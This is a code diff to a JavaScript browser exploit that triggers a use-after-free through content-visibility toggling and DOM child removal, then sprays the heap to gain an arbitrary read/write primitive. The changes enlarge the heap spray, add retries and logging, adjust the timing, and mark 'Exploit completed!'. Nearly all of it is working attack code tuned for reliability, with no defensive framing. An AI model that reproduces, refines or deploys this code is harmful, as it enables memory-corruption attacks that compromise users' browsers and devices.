@@ -62,11 +62,10 @@ const ssv_len = (() => {
     }
 })();
 
-const num_reuses = 15000; // Increased for better heap spray
-const DELAY = 100; // Adjusted for better timing
+const num_reuses = 20000; // Increased for better heap spray
+const MAX_ATTEMPTS = 15; // Increased max retry attempts
 let attemptCount = 0;
 const fakeStates = []; // Global array to store fake state objects
-const MAX_ATTEMPTS = 10; // Increased max retry attempts
 
 function gc() {
     new Uint8Array(4 * MB);
@@ -92,6 +91,7 @@ function prepare_uaf() {
     // Remove any existing container to avoid conflicts
     const existingContainer = document.querySelector('.container');
     if (existingContainer) {
+        log('Removing existing container');
         existingContainer.remove();
     }
 
@@ -101,6 +101,7 @@ function prepare_uaf() {
     child.className = 'child';
     container.appendChild(child);
     document.body.appendChild(container);
+    log('Created new container and child');
     return container;
 }
 
@@ -138,19 +139,30 @@ async function uaf_ssv(container) {
             observer.observe(newContainer, { childList: true, subtree: true });
 
             // Trigger UAF
+            log('Setting content-visibility to hidden');
             newContainer.style.contentVisibility = 'hidden';
+            log('Removing child element');
             childElement.remove();
 
-            await new Promise(resolve => setTimeout(resolve, DELAY));
+            // Use requestAnimationFrame for better timing
+            await new Promise(resolve => requestAnimationFrame(resolve));
 
+            log('Restoring content-visibility to auto');
             newContainer.style.contentVisibility = 'auto';
 
             // Additional heap spray
+            log('Performing additional heap spray');
             for (let i = 0; i < 200; i++) {
                 new Uint8Array(1024 * 1024);
             }
+            // Diverse heap spray
+            for (let i = 0; i < 100; i++) {
+                new ArrayBuffer(0x1000);
+                new Uint32Array(0x400);
+            }
 
             // Heap spray for reuse
+            log('Starting main heap spray');
             for (let i = 0; i < num_reuses; i++) {
                 const view = new Uint8Array(new ArrayBuffer(ssv_len));
                 view[0] = 0x41;
@@ -180,6 +192,7 @@ async function uaf_ssv(container) {
             }
 
             if (res.length === 2) {
+                log('UAF successful!');
                 observer.disconnect();
                 newContainer.remove(); // Clean up
                 return res;
@@ -552,6 +565,7 @@ export async function main() {
         const rdr = await make_rdr(view);
         log('STAGE: achieve arbitrary read/write primitive');
         await make_arw(rdr, view2, pop);
+        document.getElementById('status').textContent = 'Exploit completed!';
     } finally {
         container.remove(); // Ensure cleanup
     }
